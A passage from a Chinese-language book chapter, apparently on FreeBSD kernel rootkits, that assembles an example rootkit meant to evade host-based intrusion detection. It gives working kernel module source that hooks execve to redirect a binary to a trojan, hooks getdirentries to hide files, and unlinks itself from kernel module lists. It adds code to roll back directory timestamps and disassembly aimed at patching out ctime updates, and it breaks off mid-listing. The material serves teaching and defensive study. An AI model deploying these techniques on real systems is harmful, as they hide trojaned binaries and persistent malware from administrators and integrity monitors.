# 第六章 整合一切

我们现在将使用前几章中的技术来编写一个完整的示例 rootkit——尽管这是一个微不足道的例子——以绕过*基于主机的入侵检测系统（HIDSes）*。

# HIDS 的功能

通常，HIDS 被设计用来监控、检测和记录文件系统上文件的修改。也就是说，它被设计用来检测文件篡改和特洛伊木马二进制文件。对于每个文件，HIDS 都会创建文件数据的加密哈希并将其记录在数据库中；任何对文件的更改都会导致生成不同的哈希值。每当 HIDS 审计文件系统时，它会将每个文件的当前哈希值与其数据库中的对应值进行比较；如果两者不同，则标记该文件。

从原则上讲，这是一个好主意，但……

# 绕过 HIDS

HIDS（主机入侵检测系统）软件的问题在于它信任并使用操作系统的 API。通过滥用这种信任（例如，挂钩这些 API），你可以绕过任何 HIDS。

### 注意

软件旨在检测根级妥协（例如，系统二进制的篡改）却信任底层操作系统，这有点讽刺。

现在的问题是，“我应该挂钩哪些调用？”答案取决于你想要实现什么。考虑以下场景。你有一台 FreeBSD 机器，在/sbin/目录下安装了列表 6-1 中显示的二进制文件。

```
#include <stdio.h>

int main(int argc, char *argv[])
{
        printf("May the force be with you.\n");
        return(0);
}

```

*列表 6-1: hello.c*

你想用特洛伊木马版本替换那个二进制文件——这个版本简单地打印不同的调试信息，如列表 6-2 所示——当然，不会触发 HIDS。

```
#include <stdio.h>

int main(int argc, char *argv[])
{
        printf("May the schwartz be with you!\n");
        return(0);
}

```

*列表 6-2: trojan_hello.c*

这可以通过执行*执行重定向*（halflife，1997）来实现——这仅仅是切换一个二进制文件的执行到另一个——所以每当有请求执行`hello`时，你拦截它并执行`trojan_hello`。这之所以有效，是因为你没有替换（甚至没有触及）原始的二进制文件，因此 HIDS 将始终计算正确的哈希值。

当然，这种方法有一些“小插曲”，但我们将在它们出现时处理它们。

# 执行重定向

示例 rootkit 中的执行重定向例程是通过挂钩`execve`系统调用来实现的。这个调用负责文件执行，并在文件/sys/kern/kern_exec.c 中实现如下。

```
int
execve(td, uap)
        struct thread *td;
        struct execve_args /* {
                char *fname;
                char **argv;
                char **envv;
        } */ *uap;
{
        int error;
        struct image_args args;

        ❶error = exec_copyin_args(&args, uap->fname, UIO_USERSPACE,
            uap->argv, uap->envv);

        if (error == 0)
                 ❷error = kern_execve(td, &args, NULL);

        exec_free_args(&args);

        return (error);
}

```

注意`execve`系统调用❶如何从用户数据空间复制其参数（`uap`）到一个临时缓冲区（`args`），然后❷将这个缓冲区传递给`kern_execve`函数，该函数实际上执行文件。这意味着为了将一个二进制文件的执行重定向到另一个，你只需在`execve`调用`exec_copyin_args`之前，在当前进程的用户数据空间中插入一组新的`execve`参数或更改现有的参数——列表 6-3（基于 Stephanie Wehner 的 exec.c）提供了一个示例。

```
#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>

#include <vm/vm.h>
#include <vm/vm_page.h>
#include <vm/vm_map.h>

#define ORIGINAL        "/sbin/hello"
#define TROJAN          "/sbin/trojan_hello"

/*
 * execve system call hook.
 * Redirects the execution of ORIGINAL into TROJAN.
*/
static int
execve_hook(struct thread *td, void *syscall_args)
{
        struct execve_args /* {
                char *fname;
                char **argv;
                char **envv;
        } */ *uap;
        uap = (struct execve_args *)syscall_args;

        struct execve_args kernel_ea;
        struct execve_args *user_ea;
        struct vmspace *vm;
        vm_offset_t base, addr;
        char t_fname[] = TROJAN;

        /* Redirect this process? */
        ❶if (strcmp(uap->fname, ORIGINAL) == 0) {
                /*
                 * Determine the end boundary address of the current
                 * process's user data space.
                 */
                vm = curthread->td_proc->p_vmspace;
                base = round_page((vm_offset_t) vm->vm_daddr);
                ❷addr = base + ctob(vm->vm_dsize);

                /*
                 * Allocate a PAGE_SIZE null region of memory for a new set
                 * of execve arguments.
                 */
                 ❸vm_map_find(&vm->vm_map, NULL, 0, &addr, PAGE_SIZE, FALSE,
                    VM_PROT_ALL, VM_PROT_ALL, 0);
                vm->vm_dsize += btoc(PAGE_SIZE);

                /*
                 * Set up an execve_args structure for TROJAN. Remember, you
                 * have to place this structure into user space, and because
                 * you can't point to an element in kernel space once you are
                 * in user space, you'll have to place any new "arrays" that
                 * this structure points to in user space as well.
                 */
                ❹copyout(&t_fname, (char *)addr, strlen(t_fname));
                kernel_ea.fname = (char *)addr;
                kernel_ea.argv = uap->argv;
                kernel_ea.envv = uap->envv;

                /* Copy out the TROJAN execve_args structure. */
                user_ea = (struct execve_args *)addr + sizeof(t_fname);
                ❺copyout(&kernel_ea, user_ea, sizeof(struct execve_args));

                /* Execute TROJAN. */
                ❻return(execve(curthread, user_ea));
        }
        return(execve(td, syscall_args));

}

/* The function called at load/unload. */
static int
load(struct module *module, int cmd, void *arg)
{
        sysent[SYS_execve].sy_call = (sy_call_t *)execve_hook;

        return(0);

}

static moduledata_t incognito_mod = {
        "incognito",            /* module name */
        load,                   /* event handler */
        NULL                    /* extra data */
};

DECLARE_MODULE(incognito, incognito_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);

```

*列表 6-3: incognito-0.1.c*

在这个列表中，函数 `execve_hook`❶ 首先检查要执行的文件名。如果文件名是 /sbin/hello，❷ 当前进程的用户数据空间的结束边界地址存储在 `addr` 中，然后传递给 ❸ `vm_map_find` 以在该处映射一个 `PAGE_SIZE` 大小的 `NULL` 内存块。接下来，❹ 为 `trojan_hello` 二进制文件设置一个 `execve` 参数结构，然后将其 ❺ 插入到新“分配”的用户数据空间中。最后，❻ 使用 `execve` 调用，其第二个参数是 `trojan_hello execve_args` 结构的地址——实际上是将 `hello` 的执行重定向到 `trojan_hello`。

### 注意

关于 *`execve_hook`* 的一个有趣细节是，经过一两个细微的修改，它就是从内核空间执行用户空间进程所需的精确代码。

还有一点也值得提一下。注意，这次事件处理函数没有卸载系统调用钩子；那将需要重启。这是因为“活”的 rootkit 没有卸载例程的需求——一旦安装，你希望它保持安装状态。

下面的输出显示了示例 rootkit 的运行情况。

```
`$ hello`
May the force be with you.
`$ trojan_hello`
May the schwartz be with you!
`$ sudo kldload ./incognito-0.1.ko $ hello`
May the schwartz be with you!

```

太棒了，它工作了。现在我们已经有效地将 `hello` 木马化了，没有任何 HIDS 会察觉到——除了我们在文件系统中放置了一个新的二进制文件（`trojan_hello`），任何 HIDS 都会将其标记出来。唉！

# 文件隐藏

为了解决这个问题，让我们隐藏 `trojan_hello`，使其不在文件系统中出现。这可以通过挂钩 `getdirentries` 系统调用来实现。这个调用负责列出（即返回）目录的内容，并在文件 `/sys/kern/vfs_syscalls.c` 中实现如下。

### 注意

看看这段代码，并尝试从中找出一些结构。如果你不完全理解它，不要担心。关于 *`getdirentries`* 系统调用的解释将在列表之后出现。

```
int
getdirentries(td, uap)
        struct thread *td;
        register struct getdirentries_args /* {
                int fd;
                char *buf;
                u_int count;
                long *basep;
        } */ *uap;
{
        struct vnode *vp;
        struct file *fp;
        struct uio auio;
        struct iovec aiov;
        int vfslocked;
        long loff;
        int error, eofflag;

        if ((error = getvnode(td->td_proc->p_fd, uap->fd, &fp)) != 0)
                return (error);
        if ((fp->f_flag & FREAD) == 0) {
                fdrop(fp, td);
                return (EBADF);
        }
        vp = fp->f_vnode;
unionread:
        vfslocked = VFS_LOCK_GIANT(vp->v_mount);
        if (vp->v_type != VDIR) {
                error = EINVAL;
                goto fail;
        }
        aiov.iov_base = uap->buf;
        aiov.iov_len = uap->count;
        auio.uio_iov = &aiov;
        auio.uio_iovcnt = 1;
        auio.uio_rw = UIO_READ;
        auio.uio_segflg = UIO_USERSPACE;
        auio.uio_td = td;
        auio.uio_resid = uap->count;
        /* vn_lock(vp, LK_SHARED | LK_RETRY, td); */
        vn_lock(vp, LK_EXCLUSIVE | LK_RETRY, td);
        loff = auio.uio_offset = fp->f_offset;
#ifdef MAC
        error = mac_check_vnode_readdir(td->td_ucred, vp);
        if (error == 0)
#endif
                error = VOP_READDIR(vp, &auio, fp->f_cred, &eofflag, NULL,
                    NULL);
        fp->f_offset = auio.uio_offset;
        VOP_UNLOCK(vp, 0, td);
        if (error)
                goto fail;
        if (uap->count == auio.uio_resid) {
                if (union_dircheckp) {
                        error = union_dircheckp(td, &vp, fp);
                        if (error == −1) {
                                VFS_UNLOCK_GIANT(vfslocked);
                                goto unionread;
                        }
                        if (error)
                                goto fail;
                }
                /*
                 * XXX We could delay dropping the lock above but
                 * union_dircheckp complicates things.
                 */
                vn_lock(vp, LK_EXCLUSIVE | LK_RETRY, td);
                if ((vp->v_vflag & VV_ROOT) &&
                    (vp->v_mount->mnt_flag & MNT_UNION)) {
                        struct vnode *tvp = vp;
                        vp = vp->v_mount->mnt_vnodecovered;
                        VREF(vp);
                        fp->f_vnode = vp;
                        fp->f_data = vp;
                        fp->f_offset = 0;
                        vput(tvp);
                        VFS_UNLOCK_GIANT(vfslocked);
                        goto unionread;
                }
                VOP_UNLOCK(vp, 0, td);
        }
        if (uap->basep != NULL) {
                error = copyout(&loff, uap->basep, sizeof(long));
        }
        ❶td->td_retval[0] = uap->count - auio.uio_resid;
fail:
        VFS_UNLOCK_GIANT(vfslocked);
        fdrop(fp, td);
        return (error);
}

```

`getdirentries` 系统调用将目录条目（即文件描述符）`fd` 指向的内容读取到缓冲区 `buf` 中。简单来说，`getdirentries` 获取目录条目。如果成功，返回实际传输的字节数。否则，返回 `-1` 并将全局变量 `errno` 设置为指示错误。

将读取到 `buf` 的目录条目存储为一系列 `dirent` 结构，这些结构在 `<sys/dirent.h>` 头文件中定义如下：

```
struct dirent {
        __uint32_t d_fileno;            /* inode number */
        __uint16_t d_reclen;            /* length of this directory entry */
        __uint8_t  d_type;              /* file type */
        __uint8_t  d_namlen;            /* length of the filename */
#if __BSD_VISIBLE
#define MAXNAMLEN       255
        char    d_name[MAXNAMLEN + 1];  /* filename */
#else
        char    d_name[255 + 1];        /* filename */
#endif
};

```

如此列表所示，每个目录条目的上下文都保存在一个 `dirent` 结构中。这意味着为了在文件系统中隐藏一个文件，你只需防止 `getdirentries` 将文件的 `dirent` 结构存储在 `buf` 中。列表 6-4 是一个示例 rootkit，它被调整为执行此操作（基于 pragmatic 的文件隐藏例程，1999）。

### 注意

为了节省空间，我没有完整地重新列出执行重定向例程（即 `execve_hook` 函数）。

```
#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>
#include <sys/malloc.h>

#include <vm/vm.h>
#include <vm/vm_page.h>
#include <vm/vm_map.h>

#include <dirent.h>

#define ORIGINAL        "/sbin/hello"
#define TROJAN          "/sbin/trojan_hello"
#define T_NAME          "trojan_hello"

/*
 * execve system call hook.
 * Redirects the execution of ORIGINAL into TROJAN.
 */
static int
execve_hook(struct thread *td, void *syscall_args)
{
. . .
}

/*
 * getdirentries system call hook.
 * Hides the file T_NAME.
 */
static int
getdirentries_hook(struct thread *td, void *syscall_args)
{
        struct getdirentries_args /* {
                int fd;
                char *buf;
                u_int count;
                long *basep;
        } */ *uap;
        uap = (struct getdirentries_args *)syscall_args;

        struct dirent *dp, *current;
        unsigned int size, count;

        /*
         * Store the directory entries found in fd in buf, and record the
         * number of bytes actually transferred.
         */
        ❶getdirentries(td, syscall_args);
        size = td->td_retval[0];

        /* Does fd actually contain any directory entries? */
        ❷if (size > 0) {
                MALLOC(dp, struct dirent *, size, M_TEMP, M_NOWAIT);
                ❸copyin(uap->buf, dp, size);

                current = dp;
                count = size;

                /*
                 * Iterate through the directory entries found in fd.
                 * Note: The last directory entry always has a record length
                 * of zero.
                 */
                while ((current->d_reclen != 0) && (count > 0)) {
                        count -= current->d_reclen;

                        /* Do we want to hide this file? */
                        ❹if(strcmp((char *)&(current->d_name), T_NAME) == 0)
                       {
                                /*
                                 * Copy every directory entry found after
                                 * T_NAME over T_NAME, effectively cutting it
                                 * out.
                                 */
                                if (count != 0)
                                        ❺bcopy((char *)current +
                                            current->d_reclen, current,
                                            count);

                                size -= current->d_reclen;
                                break;
                        }

                        /*
                         * Are there still more directory entries to
                         * look through?
                         */
                        if (count != 0)
                                /* Advance to the next record. */
                                current = (struct dirent *)((char *)current +
                                    current->d_reclen);

                }

                /*

                 * If T_NAME was found in fd, adjust the "return values" to
                 * hide it. If T_NAME wasn't found...don't worry 'bout it.
                 */
                ❻td->td_retval[0] = size;
                ❼copyout(dp, uap->buf, size);

                FREE(dp, M_TEMP);
        }

        return(0);
}

/* The function called at load/unload. */
static int
load(struct module *module, int cmd, void *arg)
{
        sysent[SYS_execve].sy_call = (sy_call_t *)execve_hook;
        sysent[SYS_getdirentries].sy_call = (sy_call_t *)getdirentries_hook;

        return(0);
}
static moduledata_t incognito_mod = {
        "incognito",            /* module name */
        load,                   /* event handler */
        NULL                    /* extra data */
};

DECLARE_MODULE(incognito, incognito_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);

```

*列表 6-4：incognito-0.2.c*

在此代码中，函数 `getdirentries_hook` ❶ 首先调用 `getdirentries` 以将 `fd` 中找到的目录条目存储到 `buf` 中。接下来，❷ 检查实际传输的字节数，如果大于零（即，如果 `fd` 实际上包含任何目录条目），❸ 则将 `buf`（它是一系列 `dirent` 结构）的内容复制到内核空间。之后，❹ 将每个 `dirent` 结构的文件名与常量 `T_NAME`（在这种情况下为 `trojan_hello`）进行比较。如果找到匹配项，❺ 则将“幸运”的 `dirent` 结构从 `buf` 的内核空间副本中移除，最终 ❼ 复制出来，覆盖 `buf` 的内容，从而有效地隐藏 `T_NAME`（即，`trojan_hello`）。此外，为了保持一致性，❻ 调整实际传输的字节数以补偿“丢失”此 `dirent` 结构。

现在，如果你安装新的根工具包，你会得到：

```
`$ ls /sbin/t*`
/sbin/trojan_hello /sbin/tunefs
`$ sudo kldload ./incognito-0.2.ko $ hello`
May the schwartz be with you!
`$ ls /sbin/t*`
/sbin/tunefs

```

太棒了。我们现在已经有效地木马化了 `hello`，而没有在文件系统中留下任何痕迹.^([1]) 当然，这一切都没有关系，因为简单的 `kldstat(8)` 就会揭示根工具包：

```
$ `kldstat`
Id Refs Address    Size     Name
 1    4 0xc0400000 63070c   kernel
 2   16 0xc0a31000 568dc    acpi.ko
 3    1 0xc1ebc000 2000     incognito-0.2.ko

```

真糟糕！

* * *

^([1]) ¹ 实际上，你仍然可以用 `ls /sbin/trojan_hello` 找到 `trojan_hello`，因为直接查找没有被阻止。阻止文件直接查找并不太难，但很麻烦。你需要挂钩 `open(2)`、`stat(2)` 和 `lstat(2)`，并在文件是 `/sbin/trojan_hello` 时让它们返回 `ENOENT`。

# 隐藏一个 KLD

为了解决这个问题，我们将使用一些 DKOM 来隐藏根工具包，技术上讲，这是一个 KLD。

回想一下 第一章，每次将 KLD 加载到内核时，实际上是在加载一个包含一个或多个内核模块的链接文件。因此，每次加载 KLD 时，它都会存储在两个不同的列表中：`linker_files` 和 `modules`。正如它们的名称所暗示的，`linker_files` 包含加载的链接文件集合，而 `modules` 包含加载的内核模块集合。

与之前的 DKOM 代码一样，KLD 隐藏例程将以安全的方式遍历这两个列表并移除您选择的结构。

## 链接文件列表

`linker_files` 列表在文件 `/sys/kern/kern_linker.c` 中定义如下：

```
static linker_file_list_t linker_files;

```

注意，`linker_files` 被声明为 `linker_file_list_t` 类型，该类型在 `<sys/linker.h>` 头文件中定义如下：

```
typedef TAILQ_HEAD(, linker_file) linker_file_list_t;

```

从这些列表中，你可以看到 `linker_files` 只是一个 `linker_file` 结构的双向链尾队列。

关于 `linker_files` 的一个有趣细节是它有一个关联的计数器，该计数器在文件 `/sys/kern/kern_linker.c` 中定义如下：

```
static int next_file_id = 1;

```

当加载链接文件时（即，每当向 `linker_files` 添加条目时），其文件 ID 号成为 `next_file_id` 的当前值，然后增加一。

关于 `linker_files` 的另一个有趣细节是，与本书中的其他列表不同，它没有由专门的锁保护；这迫使我们使用 `Giant`。`Giant` 大概是“万用”锁，旨在保护整个内核。它在 `<sys/mutex.h>` 头文件中定义如下：

```
extern struct mtx Giant;

```

### 备注

在 FreeBSD 6.0 中，*`linker_files`* 确实有一个关联的锁，该锁名为 *`kld_mtx`*。然而，*`kld_mtx`* 并没有真正保护 *`linker_files`*，这就是我们为什么使用 *`Giant`* 的原因。在 FreeBSD 7 版本中，*`linker_files`* 由一个 sx 锁保护。

## 链接文件结构

每个链接文件的内容都保存在一个 `linker_file` 结构体中，该结构体在 `<sys/linker.h>` 头文件中定义。以下列表描述了 `struct linker_file` 结构体中的字段，这些字段是你为了隐藏链接文件需要了解的。

*内部引用；*

此字段维护链接文件的引用计数。

需要注意的一个重要点是，`linker_files` 中的第一个 `linker_file` 结构体是当前内核镜像，每当加载一个链接文件时，此结构体的 `refs` 字段会增加一，如下所示：

```
$ `kldstat`
Id Refs Address    Size     Name
 1    3 0xc0400000 63070c   kernel
 2   16 0xc0a31000 568dc    acpi.ko
$ `sudo kldload ./incognito-0.2.ko`
$ `kldstat`
Id Refs Address    Size     Name
 1    4 0xc0400000 63070c   kernel
 2   16 0xc0a31000 568dc    acpi.ko
 3    1 0xc1e89000 2000     incognito-0.2.ko

```

如你所见，在加载 incognito-0.2.ko 之前，当前内核镜像的引用计数是 3，但之后变为 4。因此，在隐藏链接文件时，你必须记得将当前内核镜像的 `refs` 字段减一。

**`TAILQ_ENTRY(linker_file) link;`**

此字段包含与 `linker_file` 结构体关联的链接指针，该结构体存储在 `linker_files` 列表中。在插入、删除和遍历 `linker_files` 时会引用此字段。

**`char* filename;`**

此字段包含链接文件的名称。

## 模块列表

`modules` 列表在文件 `/sys/kern/kern_module.c` 中定义，如下所示：

```
static modulelist_t modules;

```

注意到 `modules` 被声明为 `modulelist_t` 类型，该类型在文件 `/sys/kern/kern_module.c` 中定义如下：

```
typedef TAILQ_HEAD(, module) modulelist_t;

```

从这些列表中，你可以看到 `modules` 只是一个 `module` 结构体的双链表尾队列。

与 `linker_files` 列表一样，`modules` 也有一个关联的计数器，该计数器在文件 `/sys/kern/kern_module.c` 中定义如下：

```
static int nextid = 1;

```

对于每个加载的内核模块，其 modid 变为 `nextid` 的当前值，然后 `nextid` 增加一。

与 `modules` 列表相关的资源访问控制定义在 `<sys/module.h>` 头文件中，如下所示：

```
extern struct sx modules_sx;

```

## 模块结构

每个内核模块的内容都保存在一个 `module` 结构体中，该结构体在文件 `/sys/kern/kern_module.c` 中定义。以下列表描述了 `struct module` 结构体中的字段，这些字段是你为了隐藏内核模块需要了解的。

**`TAILQ_ENTRY(module) link;`**

此字段包含与 `module` 结构体关联的链接指针，该结构体存储在 `modules` 列表中。在插入、删除和遍历 `modules` 时会引用此字段。

**`char* name;`**

此字段包含内核模块的名称。

## 示例

列表 6-5 展示了新的改进版的 rootkit，它现在可以隐藏自己。它通过从 `linker_files` 和 `modules` 列表中移除其 `linker_file` 和 `module` 结构来实现。为了保持一致性，它还将当前内核映像的引用计数、链接文件计数器（`next_file_id`）和模块计数器（`nextid`）减一。

### 注意

为了节省空间，我没有重新列出执行重定向和文件隐藏例程。

```
#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>
#include <sys/malloc.h>

#include <sys/linker.h>
#include <sys/lock.h>
#include <sys/mutex.h>

#include <vm/vm.h>
#include <vm/vm_page.h>
#include <vm/vm_map.h>

#include <dirent.h>

#define ORIGINAL        "/sbin/hello"
#define TROJAN          "/sbin/trojan_hello"
#define T_NAME          "trojan_hello"
#define VERSION         "incognito-0.3.ko"

/*
 * The following is the list of variables you need to reference in order
 * to hide this module, which aren't defined in any header files.
 */
extern linker_file_list_t linker_files;
extern struct mtx kld_mtx;
extern int next_file_id;
typedef TAILQ_HEAD(, module) modulelist_t;
extern modulelist_t modules;
extern int nextid;
struct module {
        TAILQ_ENTRY(module)     link;    /* chain together all modules */
        TAILQ_ENTRY(module)     flink;   /* all modules in a file */
        struct linker_file      *file;   /* file which contains this module */
        int                     refs;    /* reference count */
        int                     id;      /* unique id number */
        char                    *name;   /* module name */
        modeventhand_t          handler; /* event handler */
        void                    *arg;    /* argument for handler */
        modspecific_t           data;    /* module specific data */
};

/*
 * execve system call hook.
 * Redirects the execution of ORIGINAL into TROJAN.
 */
static int
execve_hook(struct thread *td, void *syscall_args)
{
. . .
}

/*
 * getdirentries system call hook.
 * Hides the file T_NAME.
 */
static int
getdirentries_hook(struct thread *td, void *syscall_args)
{
. . .
}

/* The function called at load/unload. */
static int
load(struct module *module, int cmd, void *arg)
{
        struct linker_file *lf;
        struct module *mod;

        mtx_lock(&Giant);
        mtx_lock(&kld_mtx);

        /* Decrement the current kernel image's reference count. */
        (&linker_files)->tqh_first->refs--;

        /*
         * Iterate through the linker_files list, looking for VERSION.
         * If found, decrement next_file_id and remove from list.
         */
        TAILQ_FOREACH(lf, &linker_files, link) {
                if (strcmp(lf->filename, VERSION) == 0) {
                        next_file_id--;
                        TAILQ_REMOVE(&linker_files, lf, link);
                        break;
                }
        }

        mtx_unlock(&kld_mtx);
        mtx_unlock(&Giant);

        sx_xlock(&modules_sx);

        /*
         * Iterate through the modules list, looking for "incognito."
         * If found, decrement nextid and remove from list.
         */
        TAILQ_FOREACH(mod, &modules, link) {
                if (strcmp(mod->name, "incognito") == 0) {
                        nextid--;
                        TAILQ_REMOVE(&modules, mod, link);
                        break;
                }
        }

        sx_xunlock(&modules_sx);

        sysent[SYS_execve].sy_call = (sy_call_t *)execve_hook;
		sysent[SYS_getdirentries].sy_call = (sy_call_t *)getdirentries_hook;

        return(0);
}

static moduledata_t incognito_mod = {
        "incognito",            /* module name */
        load,                   /* event handler */
        NULL                    /* extra data */
};

DECLARE_MODULE(incognito, incognito_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);

```

*列表 6-5：incognito-0.3.c*

现在，加载上述 KLD 给我们：

```
$ `kldstat`
Id Refs Address    Size     Name
 1    3 0xc0400000 63070c   kernel
 2   16 0xc0a31000 568dc    acpi.ko
$ `sudo kldload ./incognito-0.3.ko`
$ `hello`
May the schwartz be with you!
$ `ls /sbin/t*`
/sbin/tunefs
$ `kldstat`
Id Refs Address    Size     Name
 1    3 0xc0400000 63070c   kernel
 2   16 0xc0a31000 568dc    acpi.ko

```

注意 `kldstat(8)` 的输出在安装 rootkit 前后是相同的——太棒了！

在这一点上，你可以将 `hello` 的执行重定向到 `trojan_hello`，同时隐藏 `trojan_hello` 和 rootkit 本身（这随后使得它不可卸载）。只有一个问题。当你将 `trojan_hello` 安装到 `/sbin/` 中时，目录的访问、修改和更改时间会更新——这是一个明显的迹象，表明出了问题。

# 防止访问、修改和更改时间更新

因为文件上的访问和修改时间可以被设置，所以你只需通过回滚它们来“防止”它们更新。列表 6-6 展示了如何做到这一点：

```
#include <errno.h>
#include <stdio.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/stat.h>

int
main(int argc, char *argv[])
{
struct stat sb;
struct timeval time[2];

	   ❶if (stat("/sbin", &sb) < 0) {
                     fprintf(stderr, "STAT ERROR: %d\n", errno);
                     exit(-1);

	   }

	   ❷time[0].tv_sec = sb.st_atime;
	   time[1].tv_sec = sb.st_mtime;

	   /*
	    * Do something to /sbin/.
	    */

        ❸if (utimes("/sbin", (struct timeval *)&time) < 0) {
					  fprintf(stderr, "UTIMES ERROR: %d\n", errno);
					  exit(-1);
		}

		exit(0);
}

```

*列表 6-6：rollback.c*

之前的代码首先 ❶ 调用 `stat` 函数来获取 `/sbin/` 目录的文件系统信息。这个信息被放置在变量 `sb` 中，这是一个由 `<sys/stat.h>` 头文件定义的 `stat` 结构。与我们的讨论相关的 `struct stat` 字段如下：

```
time_t    st_atime;           /* time of last access */
time_t    st_mtime;			  /* time of last data modification */

```

接下来，❷ `/sbin/` 的访问和修改时间存储在 `time[]` 中，这是一个包含两个 `timeval` 结构的数组，在 `<sys/_timeval.h>` 头文件中定义如下：

```
struct timeval {
        long          tv_sec;      /* seconds */
        suseconds_t   tv_usec;     /* and microseconds */
};

```

最后，❸ 调用 `utimes` 函数来设置（或回滚）`/sbin/` 的访问和修改时间，有效地“防止”它们更新。

## 更改时间

不幸的是，更改时间不能被设置或回滚，因为这会违反其预期目的，即记录所有文件状态变化，包括对访问或修改时间的“纠正”。负责更新 inode 更改时间（以及其访问和修改时间）的函数是 `ufs_itimes`，它在文件 `/sys/ufs/ufs/ufs_vnops.c` 中实现如下：

```
void
ufs_itimes(vp)
		struct vnode *vp;
{
		struct inode *ip;
		struct timespec ts;

		ip = VTOI(vp);
		if ((ip->i_flag &(IN_ACCESS | IN_CHANGE | IN_UPDATE)) == 0)
			    return;
		if ((vp->v_type == VBLK || vp->v_type == VCHR) && !DOINGSOFTDEP(vp))
				ip->i_flag |= IN_LAZYMOD;
		else
				ip->i_flag |= IN_MODIFIED;
		if ((vp->v_mount->mnt_flag & MNT_RDONLY) == 0) {
				vfs_timestamp(&ts);
				if (ip->i_flag &IN_ACCESS) {
				DIP_SET(ip, i_atime, ts.tv_sec);
				DIP_SET(ip, i_atimensec, ts.tv_nsec);
}
		if (ip->i_flag &IN_UPDATE) {
				DIP_SET(ip, i_mtime, ts.tv_sec);
				DIP_SET(ip, i_mtimensec, ts.tv_nsec);
				ip->i_modrev++;
		}
		if (ip->i_flag &IN_CHANGE) {
		`DIP_SET(ip, i_ctime, ts.tv_sec);         DIP_SET(ip, i_ctimensec, ts.tv_nsec);`
		}
	}
	ip->i_flag &= ~(IN_ACCESS | IN_CHANGE | IN_UPDATE);
}

```

如果你将加粗的行 `nop` 出来，你可以有效地防止对 inode 更改时间的所有更新。

话虽如此，你需要知道这些行（即 `DIP_SET` 宏）在加载到主内存后看起来是什么样子。

```
`$ nm /boot/kernel/kernel | grep ufs_itimes`
c06c0e60 T ufs_itimes
`$ objdump -d --start-address=0xc06c0e60 /boot/kernel/kernel`

/boot/kernel/kernel: file format elf32-i386-freebsd

Disassembly of section .text:

c06c0e60 <ufs_itimes>:
c06c0e60:       55                      push   %ebp
c06c0e61:       89 e5                   mov    %esp,%ebp
c06c0e63:       83 ec 14                sub    $0x14,%esp
c06c0e66:       89 5d f8                mov    %ebx,0xfffffff8(%ebp)
c06c0e69:       8b 4d 08                mov    0x8(%ebp),%ecx
c06c0e6c:       89 75 fc                mov    %esi,0xfffffffc(%ebp)
c06c0e6f:       8b 59 0c                mov    0xc(%ecx),%ebx
c06c0e72:       8b 53 10                mov    0x10(%ebx),%edx
c06c0e75:       f6 c2 07                test   $0x7,%dl
c06c0e78:       74 1f                   je     c06c0e99 <ufs_itimes+0x39>
c06c0e7a:       8b 01                   mov    (%ecx),%eax
c06c0e7c:       83 e8 03                sub    $0x3,%eax
c06c0e7f:       83 f8 01                cmp    $0x1,%eax
c06c0e82:       76 1f                   jbe    c06c0ea3 <ufs_itimes+0x43>
c06c0e84:       83 ca 08                or     $0x8,%edx
c06c0e87:       89 53 10                mov    %edx,0x10(%ebx)
c06c0e8a:       8b 41 10                mov    0x10(%ecx),%eax
c06c0e8d:       f6 40 6c 01             testb  $0x1,0x6c(%eax)
c06c0e91:       74 2d                   je     c06c0ec0 <ufs_itimes+0x60>
c06c0e93:       83 e2 f8                and    $0xfffffff8,%edx
c06c0e96:       89 53 10                mov    %edx,0x10(%ebx)
c06c0e99:       8b 5d f8                mov    0xfffffff8(%ebp),%ebx
c06c0e9c:       8b 75 fc                mov    0xfffffffc(%ebp),%esi
c06c0e9f:       89 ec                   mov    %ebp,%esp
c06c0ea1:       5d                      pop    %ebp
c06c0ea2:       c3                      ret
c06c0ea3:       8b 41 10                mov    0x10(%ecx),%eax
c06c0ea6:       f6 40 6e 20             testb  $0x20,0x6e(%eax)
c06c0eaa:       75 d8                   jne    c06c0e84 <ufs_itimes+0x24>
c06c0eac:       83 ca 40                or     $0x40,%edx
c06c0eaf:       89 53 10                mov    %edx,0x10(%ebx)
c06c0eb2:       8b 41 10                mov    0x10(%ecx),%eax
c06c0eb5:       f6 40 6c 01             testb  $0x1,0x6c(%eax)
c06c0eb9:       75 d8                   jne    c06c0e93 <ufs_itimes+0x33>
c06c0ebb:       90                      nop
c06c0ebc:       8d 74 26 00             lea    0x0(%esi),%esi
c06c0ec0:       8d 75 f0                lea    0xfffffff0(%ebp),%esi
c06c0ec3:       89 34 24                mov    %esi,(%esp)
c06c0ec6:       e8 f5 08 ef ff          call   c05b17c0 <vfs_timestamp>
c06c0ecb:       8b 53 10                mov    0x10(%ebx),%edx
c06c0ece:       f6 c2 01                test   $0x1,%dl
c06c0ed1:       74 3d                   je     c06c0f10 <ufs_itimes+0xb0>
c06c0ed3:       8b 43 0c                mov    0xc(%ebx),%eax
c06c0ed6:       83 78 14 01             cmpl   $0x1,0x14(%eax)
c06c0eda:       0f 84 bd 00 00 00       je     c06c0f9d <ufs_itimes+0x13d>
c06c0ee0:       8b 45 f0                mov    0xfffffff0(%ebp),%eax
c06c0ee3:       8b 93 80 00 00 00       mov    0x80(%ebx),%edx
c06c0ee9:       89 c1                   mov    %eax,%ecx
`c06c0eeb:       89 42 20                mov    %eax,0x20(%edx)`
c06c0eee:       c1 f9 1f                sar    $0x1f,%ecx
`c06c0ef1:       89 4a 24                mov    %ecx,0x24(%edx)`
c06c0ef4:       8b 43 0c                mov    0xc(%ebx),%eax
c06c0ef7:       83 78 14 01             cmpl   $0x1,0x14(%eax)
c06c0efb:       0f 84 f1 00 00 00       je     c06c0ff2 <ufs_itimes+0x192>
c06c0f01:       8b 93 80 00 00 00       mov    0x80(%ebx),%edx
c06c0f07:       8b 46 04                mov    0x4(%esi),%eax
